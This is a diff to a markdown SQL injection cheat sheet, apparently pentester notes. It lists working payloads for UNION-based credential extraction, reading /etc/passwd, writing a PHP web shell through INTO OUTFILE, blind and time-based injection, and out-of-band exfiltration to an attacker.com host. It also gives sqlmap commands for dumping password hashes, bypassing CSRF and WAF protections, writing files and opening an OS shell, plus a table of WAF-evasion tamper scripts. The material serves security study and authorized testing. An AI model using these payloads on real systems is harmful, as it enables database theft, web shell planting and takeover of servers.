@@ -1,6 +1,6 @@
 # SQL Injection
 
-### Types of SQL Injections
+## Types of SQL Injections
 
 * `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.
   * Output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
@@ -9,29 +9,29 @@
 * `Out-of-band` SQL injection
   * We may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.
 
-### Detect SQL Injection Vulnerabilities&#x20;
+## Detect SQL Injection Vulnerabilities&#x20;
 
 * Injection Characters:  `'` , `"`, `#`, `;`, `)` , `—` , `%27`, `%22`, `%23`, `%3B`, `%29`  <sup><sub>(Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.)<sub></sup>
 * SQL-specific syntax(ASCII(97)), `OR 1=1` , `'  or '1'='1`
 * Trigger time delays, OAST payloads to trigger out-of-band interaction&#x20;
 
-### Second-Order SQL injection&#x20;
+## Second-Order SQL injection&#x20;
 
 * First-order SQL injection arises where the application takes user input from an HTTP request&#x20;
 * Second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
 * The DB when fetching from stored values might not perform any additional sanitization and the attacker will be able to see output in another page.
 * Payload injected in a particular HTTP Request, but the effect is not visible in the same response but somewhere else within the application where this query is processed and details are retrieved.&#x20;
 
-### Retrieving Hidden Data&#x20;
+## Retrieving Hidden Data&#x20;
 
 * Use comments syntax to change the logic (`'—` )&#x20;
 * Use `' OR 1=1--` , `'+OR+1=1--`  <sup><sub>(should end with space character)<sub></sup>
 
-### &#x20;Subverting Application Logic&#x20;
+## &#x20;Subverting Application Logic&#x20;
 
 * In case of username and password -> changing logic to only check the username and ignore the password&#x20;
 
-### Retrieving Data from other Database Tables&#x20;
+## Retrieving Data from other Database Tables&#x20;
 
 * Use `UNION` keyword&#x20;
 * UNION Attacks - retrieve data from other tables -> appends one or more queries to original query
@@ -41,30 +41,30 @@
 * Individual queries must have the same number of columns&#x20;
 * Data types in each column must be compatible&#x20;
 
-### Determine the Number of Columns being Displayed using `ORDER BY`&#x20;
+## Determine the Number of Columns being Displayed using `ORDER BY`&#x20;
 
 * `'+ORDER+BY+1--`  <sup><sub>(keep incremeting the value)<sub></sup>
 * `'+UNION+SELECT+NULL,NULL--` <sup><sub>(append more<sub></sup> <sup><sub> </sup><sup><sub>`NULL`<sub></sup> <sup><sub> </sup><sup><sub>if required)<sub></sup>&#x20;
 * Reason for using NULL is because it should be compatible with the data types&#x20;
 
-### Determine the Data Type of Column&#x20;
+## Determine the Data Type of Column&#x20;
 
 * `'+UNION+SELECT+'A',NULL,NULL--`&#x20;
 * Keep changing the position of string and Increase or decrease NULL values
 
-### Retrieving Multiple Values within Single Column&#x20;
+## Retrieving Multiple Values within Single Column&#x20;
 
 * Retrieve multiple values within this single column by concatenating the values together
 * `'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`&#x20;
 * eg: oracle database uses `||` for string concatenation -> change accordingly&#x20;
 
-### Examining Database Details&#x20;
+## Examining Database Details&#x20;
 
 * Depending on DB version query changes&#x20;
 * For Oracle - requires `FROM` keyword as a must
 * Use Burp SQL injection cheat sheet
 
-### Reading Files <a href="#reading-files" id="reading-files"></a>
+## Reading Files <a href="#reading-files" id="reading-files"></a>
 
 * We can start looking for what privileges we have with that user.
   * `SELECT super_priv FROM mysql.user`
@@ -73,7 +73,7 @@
 * `SELECT LOAD_FILE('/etc/passwd');`  <sup><sub>(Might need to provide full path)<sub></sup>
 * Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`&#x20;
 
-### Writing Files <a href="#writing-files" id="writing-files"></a>
+## Writing Files <a href="#writing-files" id="writing-files"></a>
 
 * To be able to write files to the back-end server using a MySQL database, we require three things:
   1. User with `FILE` privilege enabled
@@ -87,13 +87,13 @@
 * `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`&#x20;
 * `select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -`
 
-### Blind SQL Injection Detection&#x20;
+## Blind SQL Injection Detection&#x20;
 
 * Trigger a detectable difference in the application's response depending on the true/false of a single condition.&#x20;
 * Trigger a time delay in the processing of the query&#x20;
 * Trigger an out-of-band network interaction, using OAST techniques.&#x20;
 
-### Exploiting Blind SQL Injection by Triggering Conditional Responses
+## Exploiting Blind SQL Injection by Triggering Conditional Responses
 
 * Works only if there is some kind of difference in the response
 * eg: trackingID cookie&#x20;
@@ -103,7 +103,7 @@
 * make use of `length()` and `substring()`
 * In intruder there is an option grep-match - provide the difference in response message&#x20;
 
-### Exploiting Blind SQL Injection by  Inducing Conditional Responses by Triggering SQL Errors&#x20;
+## Exploiting Blind SQL Injection by  Inducing Conditional Responses by Triggering SQL Errors&#x20;
 
 * Works only if error handling mechanism is not defined
 * `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`&#x20;
@@ -112,7 +112,7 @@
 * use `substring()` and `length()` to know about the details that is to be fetched&#x20;
 * In intruder look for 500 status code&#x20;
 
-### Exploiting Blind SQL Injection by Triggering Time Delays&#x20;
+## Exploiting Blind SQL Injection by Triggering Time Delays&#x20;
 
 * If error handling mechanism is defined
 * Triggering time delays conditionally, depending on an injected condition&#x20;
@@ -121,7 +121,7 @@
 * Time delay function varies depending on DB version
 * In resource pool change max concurrent requests to 1 and in results -> column -> response received/completed -> look for the number matching the time delay&#x20;
 
-### Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques
+## Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques
 
 * When SQL queries are not executed synchronously
 * Make use of burp collaborator&#x20;
@@ -132,7 +132,7 @@
 * `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
 * `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`
 
-### Bypass WAF using Hackvertor&#x20;
+## Bypass WAF using Hackvertor&#x20;
 
 * Encode -> dec\_entities/hex\_entities
 
@@ -169,21 +169,49 @@
 ### Search Database, Column, Table Names
 
 * `sqlmap -r req.txt --search -C style --batch`&#x20;
+* `sqlmap -r req.txt --search -T user`
+
+### DB Schema <a href="#db-schema-enumeration" id="db-schema-enumeration"></a>
+
+* `sqlmap -r req.txt" --schema`
+
+### DB Password Enumeration & Cracking <a href="#db-users-password-enumeration-and-cracking" id="db-users-password-enumeration-and-cracking"></a>
+
+* `sqlmap -r req.txt --passwords --batch`
 
 ### Bypass Protections
 
-* `sqlmap -r req.txt --csrf-token=<token-parameter-name> --batch --dump`
-* `sqlmap -r req.txt --randomize=<random-parameter-name> --batch --dump`
+* `sqlmap -r req.txt --csrf-token=<token-parameter-name> --batch --dump`  <sup><sub>(Anti-CSRF Token Bypass)<sub></sup>
+* `sqlmap -r req.txt --randomize=<random-parameter-name> --batch --dump`  <sup><sub>(Unique Value Bypass)<sub></sup>
 * `sqlmap -r req.txt --random-agent --batch --dump`&#x20;
 * `sqlmap -r req.txt --tamper=between --batch --dump`
+* `sqlmap -r req.txt --eval="import hashlib; h=hashlib.md5(<parameter-name>).hexdigest()" --batch` <sup><sub>(Calculated Parameter Bypass)<sub></sup>
 
 ### Read Files
 
 * `sqlmap -r req.txt --file-read "/var/www/html/flag.txt" --batch`&#x20;
 
+### Write Files
+
+* `sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
+
 ### OS Exploitation
 
 * `sqlmap -r req.txt --os-shell --technique=E --batch`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>
+
+### Second-Order injection
+
+* `sqlmap -r req.txt --second-req profile.req --batch`
+
+### Tamper Scripts <a href="#tamper-scripts" id="tamper-scripts"></a>
+
+<details>
+
+<summary><strong>Types</strong></summary>
+
+<table data-header-hidden data-search="false"><thead><tr><th>Tamper-Script</th><th>Description</th></tr></thead><tbody><tr><td><code>0eunion</code></td><td>Replaces instances of UNION with e0UNION</td></tr><tr><td><code>base64encode</code></td><td>Base64-encodes all characters in a given payload</td></tr><tr><td><code>between</code></td><td>Replaces greater than operator (<code>></code>) with <code>NOT BETWEEN 0 AND #</code> and equals operator (<code>=</code>) with <code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td>Replaces (MySQL) instances like <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> counterpart</td></tr><tr><td><code>equaltolike</code></td><td>Replaces all occurrences of operator equal (<code>=</code>) with <code>LIKE</code> counterpart</td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>Adds (MySQL) versioned comment before each keyword</td></tr><tr><td><code>modsecurityversioned</code></td><td>Embraces complete query with (MySQL) versioned comment</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>Embraces complete query with (MySQL) zero-versioned comment</td></tr><tr><td><code>percentage</code></td><td>Adds a percentage sign (<code>%</code>) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)</td></tr><tr><td><code>plus2concat</code></td><td>Replaces plus operator (<code>+</code>) with (MsSQL) function CONCAT() counterpart</td></tr><tr><td><code>randomcase</code></td><td>Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)</td></tr><tr><td><code>space2comment</code></td><td>Replaces space character ( ) with comments `/</td></tr><tr><td><code>space2dash</code></td><td>Replaces space character ( ) with a dash comment (<code>--</code>) followed by a random string and a new line (<code>\n</code>)</td></tr><tr><td><code>space2hash</code></td><td>Replaces (MySQL) instances of space character ( ) with a pound character (<code>#</code>) followed by a random string and a new line (<code>\n</code>)</td></tr><tr><td><code>space2mssqlblank</code></td><td>Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>space2plus</code></td><td>Replaces space character ( ) with plus (<code>+</code>)</td></tr><tr><td><code>space2randomblank</code></td><td>Replaces space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>symboliclogical</code></td><td>Replaces AND and OR logical operators with their symbolic counterparts (<code>&#x26;&#x26;</code> and <code>||</code>)</td></tr><tr><td><code>versionedkeywords</code></td><td>Encloses each non-function keyword with (MySQL) versioned comment</td></tr><tr><td><code>versionedmorekeywords</code></td><td>Encloses each keyword with (MySQL) versioned comment</td></tr></tbody></table>
+
+</details>
 
 ## Mitigation
 
